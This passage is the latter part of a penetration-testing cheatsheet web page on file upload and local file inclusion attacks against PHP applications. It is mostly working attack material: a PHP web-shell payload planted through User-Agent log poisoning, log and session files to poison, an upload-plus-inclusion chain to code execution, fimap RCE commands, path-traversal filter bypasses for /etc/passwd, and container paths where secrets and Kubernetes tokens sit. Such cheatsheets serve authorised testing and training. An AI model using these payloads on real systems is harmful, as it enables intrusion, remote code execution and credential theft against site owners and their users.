+</span></span><span class="line"><span class="cl">User-Agent: &lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>0<span class="o">])</span><span class="p">;</span> ?&gt;
+</span></span><span class="line"><span class="cl"><span class="c1">## Now hit:</span>
+</span></span><span class="line"><span class="cl">?file<span class="o">=</span>/var/log/apache2/access.log<span class="p">&amp;</span><span class="nv">0</span><span class="o">=</span>id
+</span></span></code></pre></div><p>Common log locations:</p>
+<ul>
+<li><code>/var/log/apache2/access.log</code>, <code>/var/log/apache2/error.log</code></li>
+<li><code>/var/log/nginx/access.log</code>, <code>/var/log/nginx/error.log</code></li>
+<li><code>/var/log/httpd/access_log</code>, <code>/var/log/httpd/error_log</code></li>
+<li><code>/var/log/auth.log</code> (poison via failed SSH login with PHP in username)</li>
+<li><code>/var/log/mail.log</code>, <code>/var/log/maillog</code></li>
+<li><code>/var/log/vsftpd.log</code></li>
+</ul>
+<h3 id="procselfenviron" data-heading-permalink="true"><span class="heading-content">/proc/self/environ</span>
+    <a class="heading-permalink" href="#procselfenviron" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some PHP-FPM/CGI configs expose env vars in <code>/proc/self/environ</code>. Poisoning the User-Agent puts PHP code there:</p>
+<pre tabindex="0"><code>?file=/proc/self/environ
+## with User-Agent: &lt;?php system($_GET[0]); ?&gt;
+## then: ?file=/proc/self/environ&amp;0=id
+</code></pre><p>Modern setups often have this file unreadable to the web user. Try anyway.</p>
+<h3 id="php-session-file" data-heading-permalink="true"><span class="heading-content">PHP session file</span>
+    <a class="heading-permalink" href="#php-session-file" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>PHP sessions are stored in <code>/var/lib/php/sessions/sess_&lt;sessionid&gt;</code> (or <code>/tmp/</code>). If you can write to session data (some apps write user-controlled data into the session), then include the session file:</p>
+<pre tabindex="0"><code>?file=/var/lib/php/sessions/sess_&lt;your_session_id&gt;
+</code></pre><h3 id="tmpsess_" data-heading-permalink="true"><span class="heading-content">/tmp/sess_*</span>
+    <a class="heading-permalink" href="#tmpsess_" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some configs use <code>/tmp/</code>. Easier path.</p>
+<h3 id="file-upload--lfi-chain" data-heading-permalink="true"><span class="heading-content">File upload + LFI chain</span>
+    <a class="heading-permalink" href="#file-upload--lfi-chain" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>When direct upload is restricted to non-executable extensions but you have LFI, upload a file with PHP code in it (any extension, the content matters) and include it:</p>
+<pre tabindex="0"><code>1. Upload &#34;image.jpg&#34; containing &lt;?php system($_GET[0]); ?&gt;
+2. ?file=/path/to/uploads/image.jpg&amp;0=id
+</code></pre><h2 id="ix-fimap-lfi-scanner" data-heading-permalink="true"><span class="heading-content">ix. fimap (LFI scanner)</span>
+    <a class="heading-permalink" href="#ix-fimap-lfi-scanner" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Older but still useful:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fimap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?file=test&#34;</span>
+</span></span><span class="line"><span class="cl">fimap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?file=test&#34;</span> -x    <span class="c1">## attempt RCE</span>
+</span></span></code></pre></div><p>LFI Suite is a similar option. Most modern scanners handle LFI in their general web vuln checks.</p>
+<h2 id="x-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">x. Tricks worth knowing</span>
+    <a class="heading-permalink" href="#x-tricks-worth-knowing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="detect-filter-presence" data-heading-permalink="true"><span class="heading-content">Detect filter presence</span>
+    <a class="heading-permalink" href="#detect-filter-presence" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Submit <code>?file=index.php</code> literally. If it returns the file, LFI confirmed AND not heavily filtered. If it returns the file rendered (HTML), the app is doing <code>include()</code> (LFI). If it returns the source, the app is doing file read (less useful but still leaks code).</p>
+<h3 id="null-byte-legacy" data-heading-permalink="true"><span class="heading-content">NULL byte (legacy)</span>
+    <a class="heading-permalink" href="#null-byte-legacy" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>PHP &lt; 5.3 truncates strings at <code>%00</code>. Modern PHP throws an error. Still worth testing on old apps.</p>
+<h3 id="trailing-slash-trick" data-heading-permalink="true"><span class="heading-content">Trailing slash trick</span>
+    <a class="heading-permalink" href="#trailing-slash-trick" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some apps append <code>.php</code> to the file param. Bypass with NULL byte (old PHP) or by chaining wrappers:</p>
+<pre tabindex="0"><code>?file=../../etc/passwd          ## becomes &#34;../../etc/passwd.php&#34; → error
+?file=../../etc/passwd%00       ## old PHP truncates
+?file=php://filter/.../resource=../../etc/passwd   ## the wrapper handles the path
+</code></pre><h3 id="wrappers-stack" data-heading-permalink="true"><span class="heading-content">Wrappers stack</span>
+    <a class="heading-permalink" href="#wrappers-stack" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p><code>php://filter</code> chains multiple filters separated by <code>|</code>:</p>
+<pre tabindex="0"><code>php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16/resource=/etc/passwd
+</code></pre><p>Used in the synacktiv chain generator to produce RCE without uploading.</p>
+<h3 id="path-normalization-differences" data-heading-permalink="true"><span class="heading-content">Path normalization differences</span>
+    <a class="heading-permalink" href="#path-normalization-differences" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Same path, different parsers:</p>
+<pre tabindex="0"><code>/etc/passwd
+/etc//passwd
+/etc/./passwd
+/etc/passwd/
+/etc/PASSWD       (case)
+</code></pre><p>When one is filtered, try variants.</p>
+<h3 id="containerized-apps" data-heading-permalink="true"><span class="heading-content">Containerized apps</span>
+    <a class="heading-permalink" href="#containerized-apps" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>In Docker/Kubernetes, <code>/etc/passwd</code> is the container&rsquo;s, not the host&rsquo;s. Useful files:</p>
+<ul>
+<li><code>/proc/1/cgroup</code> - reveals container ID</li>
+<li><code>/proc/self/environ</code> - env vars often have secrets</li>
+<li><code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> - K8s SA token</li>
+<li><code>/.dockerenv</code> - confirms Docker</li>
+<li>App-specific configs at <code>/app/</code>, <code>/usr/src/app/</code></li>
+</ul>
+<h2 id="xi-references" data-heading-permalink="true"><span class="heading-content">xi. References</span>
+    <a class="heading-permalink" href="#xi-references" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="upload" data-heading-permalink="true"><span class="heading-content">Upload</span>
+    <a class="heading-permalink" href="#upload" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><a href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener noreferrer">PortSwigger - File upload</a>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - Upload Insecure Files</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank" rel="noopener noreferrer">HackTricks - File upload</a>
+</li>
+<li><a href="https://github.com/portswigger/upload-scanner" target="_blank" rel="noopener noreferrer">Upload Scanner Burp extension</a>
+</li>
+<li><a href="https://github.com/almandin/fuxploider" target="_blank" rel="noopener noreferrer">fuxploider</a>
+</li>
+</ul>
+<h3 id="lfi" data-heading-permalink="true"><span class="heading-content">LFI</span>
+    <a class="heading-permalink" href="#lfi" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener noreferrer">PortSwigger - Path traversal</a>
+</li>
+<li><a href="https://portswigger.net/web-security/file-inclusion" target="_blank" rel="noopener noreferrer">PortSwigger - File inclusion</a>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - File Inclusion</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" target="_blank" rel="noopener noreferrer">HackTricks - LFI</a>
+</li>
+<li><a href="https://github.com/synacktiv/php_filter_chain_generator" target="_blank" rel="noopener noreferrer">Synacktiv PHP filter chain generator</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-wrappers" target="_blank" rel="noopener noreferrer">HackTricks - PHP wrappers</a>
+</li>
+</ul>
+<h2 id="xii-where-it-leads" data-heading-permalink="true"><span class="heading-content">xii. Where it leads</span>
+    <a class="heading-permalink" href="#xii-where-it-leads" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li>Web shell upload → RCE → [[04 Initial Access]] / [[W01 Recon &amp; Enum]]</li>
+<li>LFI source code read → identify SQLi / deserialization / hardcoded creds → exploit</li>
+<li>LFI to RCE via php://filter chain → direct RCE without upload</li>
+<li>LFI + session/log poisoning → RCE</li>
+<li>SVG with XXE → see [[WEB07 XXE]]</li>
+<li>Phar deserialization → see [[WEB14 Deserialization]]</li>
+<li>/proc/self/environ leak → credentials in env vars</li>
+</ul>
+<p>Once code execution lands, follow the standard foothold flow → [[Reverse Shells]] → [[05 Local Enum]] → privesc.</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web12-ssrf/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">SSRF</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web14-deserialization/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">Deserialization</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
